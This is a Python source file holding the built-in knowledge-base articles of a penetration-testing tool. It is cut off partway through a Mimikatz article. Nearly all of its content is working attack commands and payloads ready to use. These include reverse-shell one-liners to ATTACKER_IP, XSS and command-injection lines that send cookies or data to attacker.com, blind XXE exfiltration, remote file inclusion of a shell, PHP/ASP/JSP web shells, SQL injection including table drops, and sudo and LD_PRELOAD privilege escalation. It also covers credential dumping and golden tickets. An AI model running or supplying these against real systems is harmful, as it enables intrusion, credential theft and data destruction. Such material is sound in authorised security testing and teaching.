# app/core/builtin_articles.py
"""Built-in knowledge base articles for Huginn.

Contains 100+ pre-built articles covering common penetration testing
commands and techniques organized by category.
"""

BUILTIN_ARTICLES = [
    # =========================================================================
    # RECONNAISSANCE (15 articles)
    # =========================================================================
    {
        "title": "Nmap Host Discovery",
        "category": "Reconnaissance",
        "tags": "nmap,host-discovery,ping-sweep,network",
        "content": """# Nmap Host Discovery

## Overview
Host discovery identifies live hosts on a network before port scanning.

## Commands
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP discovery (local network)
nmap -PR 192.168.1.0/24

# TCP SYN discovery on port 443
nmap -PS443 192.168.1.0/24

# UDP discovery
nmap -PU53 192.168.1.0/24

# No ping (skip discovery)
nmap -Pn 192.168.1.1
```

## Tips
- Use `-sn` to avoid port scanning during discovery
- ARP scans are fastest on local networks
- Combine multiple discovery methods for thoroughness
""",
    },
    {
        "title": "Nmap Port Scanning Techniques",
        "category": "Reconnaissance",
        "tags": "nmap,port-scan,tcp,udp,stealth",
        "content": """# Nmap Port Scanning Techniques

## Overview
Different scan types for different scenarios.

## Commands
```bash
# TCP SYN scan (stealth)
nmap -sS 192.168.1.1

# TCP Connect scan
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Version detection
nmap -sV 192.168.1.1

# All ports
nmap -p- 192.168.1.1

# Top 1000 ports (default)
nmap --top-ports 1000 192.168.1.1

# Specific ports
nmap -p 80,443,8080 192.168.1.1
```

## Tips
- SYN scan requires root/admin privileges
- UDP scans are slow; target specific ports when possible
- Use `-T4` for faster scans on reliable networks
""",
    },
    {
        "title": "DNS Enumeration with dig and nslookup",
        "category": "Reconnaissance",
        "tags": "dns,dig,nslookup,zone-transfer,subdomain",
        "content": """# DNS Enumeration

## Overview
DNS enumeration reveals subdomains, mail servers, and network architecture.

## Commands
```bash
# Basic lookup
dig example.com ANY

# Zone transfer attempt
dig axfr @ns1.example.com example.com

# Reverse lookup
dig -x 192.168.1.1

# MX records
dig example.com MX

# Subdomain brute-force with fierce
fierce --domain example.com

# DNSRecon
dnsrecon -d example.com -t std
```

## Tips
- Zone transfers are rarely allowed but always worth trying
- Check for wildcard DNS entries that mask enumeration
- Use multiple DNS servers for comparison
""",
    },
    {
        "title": "Subdomain Enumeration",
        "category": "Reconnaissance",
        "tags": "subdomain,amass,subfinder,discovery",
        "content": """# Subdomain Enumeration

## Overview
Discovering subdomains expands the attack surface significantly.

## Tools & Commands
```bash
# Amass passive enumeration
amass enum -passive -d example.com

# Subfinder
subfinder -d example.com -o subs.txt

# Assetfinder
assetfinder --subs-only example.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq '.[].name_value'

# Gobuster DNS
gobuster dns -d example.com -w wordlist.txt
```

## Tips
- Combine multiple tools for best coverage
- Check certificate transparency logs for historical subdomains
- Verify discovered subdomains resolve before testing
""",
    },
    {
        "title": "OSINT with theHarvester",
        "category": "Reconnaissance",
        "tags": "osint,theharvester,email,reconnaissance",
        "content": """# OSINT with theHarvester

## Overview
Gather emails, names, subdomains, and IPs from public sources.

## Commands
```bash
# Search all sources
theHarvester -d example.com -b all

# Specific sources
theHarvester -d example.com -b google,linkedin,twitter

# Save results
theHarvester -d example.com -b all -f results.html
```

## Tips
- Rate limiting may require API keys for some sources
- Cross-reference findings across multiple OSINT tools
- Use discovered emails for password spraying wordlists
""",
    },
    {
        "title": "SMB Enumeration",
        "category": "Reconnaissance",
        "tags": "smb,enum4linux,smbclient,shares,netbios",
        "content": """# SMB Enumeration

## Overview
SMB enumeration reveals shares, users, groups, and policies on Windows networks.

## Commands
```bash
# Enum4linux full enumeration
enum4linux -a 192.168.1.1

# SMBClient list shares
smbclient -L //192.168.1.1 -N

# CrackMapExec
crackmapexec smb 192.168.1.0/24 --shares

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.1

# smbmap
smbmap -H 192.168.1.1
```

## Tips
- Try null sessions first (anonymous access)
- Check for writable shares that allow file upload
- Look for sensitive files in readable shares
""",
    },
    {
        "title": "SNMP Enumeration",
        "category": "Reconnaissance",
        "tags": "snmp,community-string,snmpwalk,enumeration",
        "content": """# SNMP Enumeration

## Overview
SNMP can leak system info, interfaces, routing tables, and installed software.

## Commands
```bash
# SNMPWalk with community string
snmpwalk -v2c -c public 192.168.1.1

# Enumerate users
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.77.1.2.25

# Running processes
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2

# Network interfaces
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1.2

# Brute-force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1
```

## Tips
- Default community strings: public, private, community
- SNMPv1/v2c transmit in cleartext
- SNMPv3 adds authentication but may still be misconfigured
""",
    },
    {
        "title": "LDAP Enumeration",
        "category": "Reconnaissance",
        "tags": "ldap,active-directory,ldapsearch,enumeration",
        "content": """# LDAP Enumeration

## Overview
LDAP enumeration extracts users, groups, and organizational data from directory services.

## Commands
```bash
# Anonymous bind enumeration
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com"

# Enumerate users
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(objectClass=user)" cn sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(objectClass=group)" cn member

# With credentials
ldapsearch -x -H ldap://192.168.1.1 -D "user@example.com" -w password -b "dc=example,dc=com"

# Nmap LDAP scripts
nmap --script ldap-search -p 389 192.168.1.1
```

## Tips
- Try anonymous bind first; many DCs allow it
- Base DN can often be guessed from the domain name
- Use port 636 for LDAPS (encrypted)
""",
    },
    {
        "title": "Web Application Fingerprinting",
        "category": "Reconnaissance",
        "tags": "web,fingerprint,whatweb,wappalyzer,technology",
        "content": """# Web Application Fingerprinting

## Overview
Identify web technologies, frameworks, and versions for targeted exploitation.

## Commands
```bash
# WhatWeb
whatweb https://example.com

# Wappalyzer CLI
wappalyzer https://example.com

# Nikto
nikto -h https://example.com

# HTTP headers
curl -I https://example.com

# Nmap HTTP scripts
nmap --script http-headers,http-title -p 80,443 example.com
```

## Tips
- Check X-Powered-By, Server, and X-AspNet-Version headers
- Look at HTML comments, JavaScript files, and CSS for framework clues
- Error pages often reveal technology stack details
""",
    },
    {
        "title": "Network Service Banner Grabbing",
        "category": "Reconnaissance",
        "tags": "banner,netcat,telnet,service-detection",
        "content": """# Network Service Banner Grabbing

## Overview
Banner grabbing reveals service versions for vulnerability identification.

## Commands
```bash
# Netcat banner grab
nc -nv 192.168.1.1 80

# Telnet
telnet 192.168.1.1 25

# Nmap version detection
nmap -sV --version-intensity 5 192.168.1.1

# OpenSSL for TLS services
openssl s_client -connect 192.168.1.1:443
```

## Tips
- Some services require specific handshakes to reveal banners
- Compare banners against known vulnerability databases
- Services may be configured to hide or fake banners
""",
    },
    {
        "title": "Wireless Network Reconnaissance",
        "category": "Reconnaissance",
        "tags": "wifi,wireless,aircrack,monitor-mode,scanning",
        "content": """# Wireless Network Reconnaissance

## Overview
Discover and enumerate wireless networks in range.

## Commands
```bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (for handshake capture)
airecrack-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Tips
- Always get written authorization before wireless testing
- Monitor mode support varies by adapter chipset
- WPA3 networks resist offline dictionary attacks
""",
    },
    {
        "title": "Google Dorking for Reconnaissance",
        "category": "Reconnaissance",
        "tags": "google,dorking,osint,search-operators",
        "content": """# Google Dorking

## Overview
Use advanced search operators to discover exposed information.

## Operators
```
site:example.com filetype:pdf
intitle:"index of" site:example.com
inurl:admin site:example.com
site:example.com ext:sql | ext:bak | ext:log
"password" filetype:txt site:example.com
site:example.com inurl:wp-admin
```

## Tips
- Combine operators for precise results
- Check GitHub and Pastebin for leaked credentials
- Use the Google Hacking Database (GHDB) for pre-built queries
""",
    },
    {
        "title": "SMTP Enumeration",
        "category": "Reconnaissance",
        "tags": "smtp,email,vrfy,expn,user-enumeration",
        "content": """# SMTP Enumeration

## Overview
SMTP user enumeration via VRFY, EXPN, and RCPT TO commands.

## Commands
```bash
# Netcat VRFY
nc -nv 192.168.1.1 25
HELO test.local
VRFY admin

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.1

# RCPT TO method
smtp-user-enum -M RCPT -U users.txt -D example.com -t 192.168.1.1

# Nmap scripts
nmap --script smtp-enum-users -p 25 192.168.1.1
```

## Tips
- VRFY is often disabled; try RCPT TO as fallback
- Use EXPN to expand mailing lists
- Timing differences can indicate valid vs invalid users
""",
    },
    {
        "title": "RPC and NFS Enumeration",
        "category": "Reconnaissance",
        "tags": "rpc,nfs,rpcinfo,showmount,enumeration",
        "content": """# RPC and NFS Enumeration

## Overview
Enumerate RPC services and NFS exports for accessible shares.

## Commands
```bash
# RPC info
rpcinfo -p 192.168.1.1

# Show NFS exports
showmount -e 192.168.1.1

# Mount NFS share
mount -t nfs 192.168.1.1:/share /mnt/nfs

# Nmap RPC scripts
nmap --script rpc-grind,nfs-ls -p 111,2049 192.168.1.1

# rpcclient (Windows RPC)
rpcclient -U "" -N 192.168.1.1
```

## Tips
- NFS exports with no_root_squash allow privilege escalation
- Check UIDs on mounted shares for access control bypass
- RPC services may expose additional attack surface
""",
    },
    {
        "title": "Vulnerability Scanning with Nmap Scripts",
        "category": "Reconnaissance",
        "tags": "nmap,nse,vulnerability,scripts,scanning",
        "content": """# Nmap NSE Vulnerability Scanning

## Overview
Nmap Scripting Engine (NSE) scripts detect known vulnerabilities.

## Commands
```bash
# Run vulnerability category scripts
nmap --script vuln 192.168.1.1

# Specific vulnerability check
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.1

# HTTP vulnerabilities
nmap --script http-vuln* -p 80,443 192.168.1.1

# SSL/TLS checks
nmap --script ssl-heartbleed,ssl-poodle -p 443 192.168.1.1

# Update NSE database
nmap --script-updatedb
```

## Tips
- Use `--script-args` for scripts requiring configuration
- Some scripts are intrusive; check before running in production
- Combine with `-sV` for better script selection
""",
    },
    # =========================================================================
    # EXPLOITATION (20 articles)
    # =========================================================================
    {
        "title": "Metasploit Framework Basics",
        "category": "Exploitation",
        "tags": "metasploit,msfconsole,exploit,payload",
        "content": """# Metasploit Framework Basics

## Overview
Core workflow for using Metasploit for exploitation.

## Commands
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Background session
background

# List sessions
sessions -l
```

## Tips
- Always use `check` command before exploiting when available
- Use staged payloads for smaller initial delivery
- Set up a handler before running client-side exploits
""",
    },
    {
        "title": "Password Spraying",
        "category": "Exploitation",
        "tags": "password,spraying,brute-force,authentication",
        "content": """# Password Spraying

## Overview
Test common passwords across many accounts to avoid lockouts.

## Commands
```bash
# CrackMapExec SMB spray
crackmapexec smb 192.168.1.1 -u users.txt -p 'Spring2024!' --no-bruteforce

# Spray against OWA
ruler --domain example.com brute --users users.txt --passwords passwords.txt

# Hydra HTTP form
hydra -L users.txt -p 'Password1' 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Kerbrute
kerbrute passwordspray -d example.com users.txt 'Winter2024!'
```

## Tips
- Spray one password at a time with delays to avoid lockout
- Check password policy first (lockout threshold, reset interval)
- Try seasonal patterns: Season+Year+Symbol
""",
    },
    {
        "title": "SQL Injection Manual Testing",
        "category": "Exploitation",
        "tags": "sqli,sql-injection,manual,web,database",
        "content": """# SQL Injection Manual Testing

## Overview
Manual techniques for identifying and exploiting SQL injection.

## Payloads
```sql
-- Basic detection
' OR 1=1--
' OR '1'='1
" OR ""="

-- Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--

-- Stacked queries
'; DROP TABLE users;--
```

## Tips
- Test all input parameters including headers and cookies
- Use different comment styles: --, #, /**/
- URL-encode payloads when testing via browser
""",
    },
    {
        "title": "SQLMap Automated Injection",
        "category": "Exploitation",
        "tags": "sqlmap,sql-injection,automated,database",
        "content": """# SQLMap Automated Injection

## Overview
Automate SQL injection detection and exploitation with SQLMap.

## Commands
```bash
# Basic scan
sqlmap -u "http://example.com/page?id=1"

# POST parameter
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# Cookie-based injection
sqlmap -u "http://example.com/page" --cookie="session=abc123" -p session

# Dump database
sqlmap -u "http://example.com/page?id=1" --dump

# OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# Tamper scripts for WAF bypass
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
```

## Tips
- Use `--risk=3 --level=5` for thorough testing
- `--batch` for non-interactive mode
- Save results with `--output-dir`
""",
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "category": "Exploitation",
        "tags": "xss,cross-site-scripting,web,javascript",
        "content": """# Cross-Site Scripting (XSS)

## Overview
Inject client-side scripts into web applications.

## Payloads
```html
<!-- Basic -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Filter bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- DOM-based -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Stored XSS cookie stealing -->
<script>new Image().src="http://attacker.com/log?c="+document.cookie</script>
```

## Tips
- Test reflected, stored, and DOM-based variants
- Bypass filters with encoding: HTML entities, URL encoding, Unicode
- Check all output contexts: HTML, JavaScript, attributes, URLs
""",
    },
    {
        "title": "File Inclusion Vulnerabilities (LFI/RFI)",
        "category": "Exploitation",
        "tags": "lfi,rfi,file-inclusion,path-traversal,web",
        "content": """# File Inclusion (LFI/RFI)

## Overview
Include local or remote files through vulnerable application parameters.

## Payloads
```bash
# Basic LFI
http://example.com/page?file=../../../../etc/passwd

# Null byte (PHP < 5.3)
http://example.com/page?file=../../../../etc/passwd%00

# PHP wrappers
http://example.com/page?file=php://filter/convert.base64-encode/resource=index.php
http://example.com/page?file=php://input  (POST: <?php system('id'); ?>)

# Log poisoning
# Inject into User-Agent, then include access.log
http://example.com/page?file=../../../../var/log/apache2/access.log

# RFI
http://example.com/page?file=http://attacker.com/shell.php
```

## Tips
- Check for path traversal filters and try double-encoding
- PHP wrappers work even when directory listing is disabled
- Log poisoning converts LFI to RCE
""",
    },
    {
        "title": "Command Injection",
        "category": "Exploitation",
        "tags": "command-injection,rce,os-command,web",
        "content": """# Command Injection

## Overview
Execute OS commands through vulnerable application input handling.

## Payloads
```bash
# Basic separators
; id
| id
|| id
& id
&& id
$(id)
`id`

# Blind injection (time-based)
; sleep 5
| ping -c 5 127.0.0.1

# Out-of-band data exfiltration
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com

# Bypass filters
;{id}
$IFS as space replacement: cat${IFS}/etc/passwd
```

## Tips
- Test all input vectors including filename uploads and headers
- Use time-based detection for blind injection
- Try different command separators based on OS (Linux vs Windows)
""",
    },
    {
        "title": "Server-Side Request Forgery (SSRF)",
        "category": "Exploitation",
        "tags": "ssrf,server-side,request-forgery,web",
        "content": """# Server-Side Request Forgery (SSRF)

## Overview
Force the server to make requests to unintended locations.

## Payloads
```
# Internal service access
http://127.0.0.1:80
http://localhost:8080/admin
http://169.254.169.254/latest/meta-data/ (AWS metadata)
http://metadata.google.internal/computeMetadata/v1/ (GCP)

# Bypass filters
http://127.0.0.1 → http://0x7f000001
http://127.0.0.1 → http://2130706433
http://127.0.0.1 → http://0177.0.0.1

# Protocol smuggling
gopher://127.0.0.1:25/xHELO%20test
dict://127.0.0.1:11211/stat
```

## Tips
- Cloud metadata services are high-value SSRF targets
- Try URL encoding, IP format variations, and DNS rebinding
- Check for partial SSRF (response not returned but request made)
""",
    },
    {
        "title": "Buffer Overflow Basics",
        "category": "Exploitation",
        "tags": "buffer-overflow,bof,stack,exploit-dev",
        "content": """# Buffer Overflow Basics

## Overview
Overwrite memory to control program execution flow.

## Steps
```python
# 1. Fuzzing to find crash point
import socket
buffer = "A" * 100
# Increment until crash

# 2. Find offset with pattern
msf-pattern_create -l 1000
msf-pattern_offset -l 1000 -q <EIP value>

# 3. Confirm EIP control
buffer = "A" * offset + "B" * 4 + "C" * 200

# 4. Find bad characters
# Send all chars 0x00-0xFF and check for truncation

# 5. Find JMP ESP
msf-nasm_shell
!mona jmp -r esp -cpb "\\x00"

# 6. Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -b "\\x00" -f python
```

## Tips
- Check DEP and ASLR protections before exploitation
- Use immunity debugger with mona.py for Windows targets
- NOP sled (0x90) helps with imprecise jumps
""",
    },
    {
        "title": "Reverse Shells Cheat Sheet",
        "category": "Exploitation",
        "tags": "reverse-shell,netcat,bash,python,php",
        "content": """# Reverse Shells Cheat Sheet

## Overview
Common reverse shell one-liners for various languages.

## Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
# Without -e:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
```

## Listener
```bash
nc -lvnp 4444
# Or with rlwrap for better shell
rlwrap nc -lvnp 4444
```

## Tips
- Upgrade shell: `python -c 'import pty;pty.spawn("/bin/bash")'`
- Then: Ctrl+Z, `stty raw -echo; fg`, `export TERM=xterm`
- Use encrypted shells (socat with SSL) to evade IDS
""",
    },
    {
        "title": "Kerberoasting",
        "category": "Exploitation",
        "tags": "kerberos,kerberoasting,active-directory,spn,cracking",
        "content": """# Kerberoasting

## Overview
Request service tickets for SPNs and crack them offline.

## Commands
```bash
# Impacket GetUserSPNs
GetUserSPNs.py -request -dc-ip 192.168.1.1 domain.local/user:password

# Rubeus (on Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt

# Crack with john
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

## Tips
- Target accounts with weak passwords (service accounts)
- High-privilege SPNs are the most valuable targets
- Check for AES vs RC4 encryption (RC4 is easier to crack)
""",
    },
    {
        "title": "AS-REP Roasting",
        "category": "Exploitation",
        "tags": "asrep,roasting,active-directory,kerberos,preauth",
        "content": """# AS-REP Roasting

## Overview
Attack accounts with Kerberos pre-authentication disabled.

## Commands
```bash
# Find vulnerable accounts
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -no-pass

# With credentials (enumerate vulnerable users)
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.1

# Crack hashes
hashcat -m 18200 asrep_hashes.txt wordlist.txt
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
```

## Tips
- Pre-auth disabled is required for this attack
- Often found on service accounts and legacy accounts
- Combine with user enumeration for targeted attacks
""",
    },
    {
        "title": "Pass-the-Hash Attacks",
        "category": "Exploitation",
        "tags": "pass-the-hash,pth,ntlm,lateral-movement",
        "content": """# Pass-the-Hash (PtH)

## Overview
Authenticate using NTLM hash without knowing the plaintext password.

## Commands
```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM_HASH>

# Impacket psexec
psexec.py -hashes :NTLM_HASH administrator@192.168.1.1

# Impacket wmiexec
wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.1

# Evil-WinRM
evil-winrm -i 192.168.1.1 -u administrator -H NTLM_HASH

# Mimikatz
sekurlsa::pth /user:admin /domain:example.local /ntlm:HASH
```

## Tips
- PtH works with NTLM; Kerberos uses the full hash differently
- Local admin accounts often share passwords across machines
- Use with CrackMapExec for quick network-wide checks
""",
    },
    {
        "title": "Web Shell Deployment",
        "category": "Exploitation",
        "tags": "webshell,upload,php,asp,backdoor",
        "content": """# Web Shell Deployment

## Overview
Upload or create web shells for persistent web application access.

## Shells
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```asp
<%eval request("cmd")%>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Techniques
- File upload bypass: change extension (.php5, .phtml, .pHp)
- Content-Type manipulation
- Null byte in filename (legacy)
- Double extensions: shell.php.jpg
- .htaccess upload to enable PHP in image directory

## Tips
- Use obfuscated shells to avoid detection
- Check for file upload size limits and filters
- Weevely and p0wny-shell provide interactive web shells
""",
    },
    {
        "title": "XML External Entity (XXE) Injection",
        "category": "Exploitation",
        "tags": "xxe,xml,injection,file-read,ssrf",
        "content": """# XXE Injection

## Overview
Exploit XML parsers to read files, perform SSRF, or execute code.

## Payloads
```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

<!-- Blind XXE (out-of-band) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

## Tips
- Test any endpoint accepting XML (SOAP, SVG upload, DOCX)
- PHP wrapper can base64-encode binary files
- Disable external entities in XML parser configuration to prevent
""",
    },
    {
        "title": "Exploiting Insecure Deserialization",
        "category": "Exploitation",
        "tags": "deserialization,java,python,php,rce",
        "content": """# Insecure Deserialization

## Overview
Exploit unsafe deserialization to achieve remote code execution.

## Tools & Techniques
```bash
# Java - ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Python pickle
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())

# PHP
# Look for unserialize() with user-controlled input
O:4:"User":1:{s:4:"name";s:6:"admin";}

# .NET - ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "calc"
```

## Tips
- Look for base64-encoded serialized objects in cookies/parameters
- Java: check for gadget chains in application dependencies
- ViewState in ASP.NET may be deserializable if MAC is disabled
""",
    },
    {
        "title": "SSTI - Server-Side Template Injection",
        "category": "Exploitation",
        "tags": "ssti,template-injection,jinja2,twig,rce",
        "content": """# Server-Side Template Injection

## Overview
Inject template syntax to execute code on the server.

## Detection
```
{{7*7}}  → 49 (Jinja2/Twig)
${7*7}   → 49 (FreeMarker/Velocity)
<%= 7*7 %> → 49 (ERB)
#{7*7}   → 49 (Slim)
```

## Exploitation (Jinja2)
```python
# Read file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Alternative
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
{% endif %}
{% endfor %}
```

## Tips
- Test math expressions first to identify the template engine
- Use tplmap for automated detection and exploitation
- Sandbox bypasses vary by engine version
""",
    },
    {
        "title": "JWT Token Attacks",
        "category": "Exploitation",
        "tags": "jwt,token,authentication,bypass,web",
        "content": """# JWT Token Attacks

## Overview
Exploit weak JWT implementations for authentication bypass.

## Techniques
```bash
# Decode JWT
echo "eyJ..." | base64 -d

# None algorithm attack
# Change header to {"alg":"none"} and remove signature

# HMAC/RSA confusion
# If server uses RS256, try HS256 with the public key as secret

# Brute-force weak secret
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py <JWT> -T  # tamper
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # crack
```

## Tips
- Check for algorithm confusion (RS256 → HS256)
- Test "none" algorithm with different cases
- Look for JWK injection in the header
- Kid parameter may be vulnerable to injection
""",
    },
    {
        "title": "Responder and LLMNR/NBT-NS Poisoning",
        "category": "Exploitation",
        "tags": "responder,llmnr,nbns,poisoning,ntlm,relay",
        "content": """# Responder - LLMNR/NBT-NS Poisoning

## Overview
Capture NTLM hashes by poisoning name resolution requests.

## Commands
```bash
# Start Responder
responder -I eth0 -rdwv

# NTLMRelayx (relay instead of capture)
ntlmrelayx.py -tf targets.txt -smb2support

# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt  # NTLMv2
hashcat -m 5500 hashes.txt wordlist.txt  # NTLMv1

# Multi-relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## Tips
- Run during business hours for maximum captures
- NTLMv1 is trivially crackable; NTLMv2 requires wordlist
- Relay attacks bypass the need to crack hashes entirely
- Disable LLMNR/NBT-NS via GPO as remediation
""",
    },
    {
        "title": "Privilege Escalation via Sudo Misconfigurations",
        "category": "Exploitation",
        "tags": "sudo,privilege-escalation,linux,gtfobins",
        "content": """# Sudo Privilege Escalation

## Overview
Exploit misconfigured sudo rules for privilege escalation.

## Commands
```bash
# Check sudo permissions
sudo -l

# Common escalations (check GTFOBins)
sudo vim -c '!sh'
sudo find / -exec /bin/sh \\;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python -c 'import os; os.system("/bin/sh")'
sudo env /bin/sh

# LD_PRELOAD exploitation
# If env_keep includes LD_PRELOAD:
echo '#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { system("/bin/bash"); }' > /tmp/pe.c
gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
```

## Tips
- Always check GTFOBins for sudo-exploitable binaries
- NOPASSWD entries are highest priority targets
- Check for wildcards in sudo rules (path injection)
""",
    },
    # =========================================================================
    # POST-EXPLOITATION (18 articles)
    # =========================================================================
    {
        "title": "Linux Privilege Escalation Checklist",
        "category": "Post-Exploitation",
        "tags": "privesc,linux,enumeration,suid,cron",
        "content": """# Linux Privilege Escalation Checklist

## Key Checks
```bash
# Current user and groups
id; whoami; groups

# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Writable /etc/passwd
ls -la /etc/passwd

# Capabilities
getcap -r / 2>/dev/null

# Writable PATH directories
echo $PATH | tr ':' '\\n' | xargs ls -ld

# Kernel version
uname -a
cat /etc/os-release

# Running processes
ps aux | grep root

# Internal services
ss -tlnp
```

## Automated Tools
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t
```

## Tips
- Always run automated enumeration AND manual checks
- Check for Docker group membership (container escape)
- Look for credentials in config files, history, and environment
""",
    },
    {
        "title": "Windows Privilege Escalation Checklist",
        "category": "Post-Exploitation",
        "tags": "privesc,windows,enumeration,services,registry",
        "content": """# Windows Privilege Escalation Checklist

## Key Checks
```powershell
# Current user
whoami /all

# System info
systeminfo

# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows"

# Weak service permissions
accesschk.exe /accepteula -uwcqv "Everyone" *

# AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list

# Scheduled tasks
schtasks /query /fo TABLE /nh

# Installed patches (missing patches = vulns)
wmic qfe list
```

## Automated Tools
```powershell
# WinPEAS
winpeas.exe

# PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks
```

## Tips
- SeImpersonatePrivilege → Potato attacks
- Always check for unquoted service paths
- Token impersonation is often the fastest path
""",
    },
    {
        "title": "Credential Dumping with Mimikatz",
        "category": "Post-Exploitation",
        "tags": "mimikatz,credentials,lsass,windows,dump",
        "content": """# Credential Dumping with Mimikatz

## Overview
Extract plaintext passwords, hashes, and Kerberos tickets from memory.

## Commands
```
# Enable debug privilege
privilege::debug

# Dump logon passwords
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# DCSync attack
lsadump::dcsync /domain:example.local /user:administrator

# Export Kerberos tickets
sekurlsa::tickets /export

# Golden ticket
kerberos::golden /user:administrator /domain:example.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Pass-the-hash
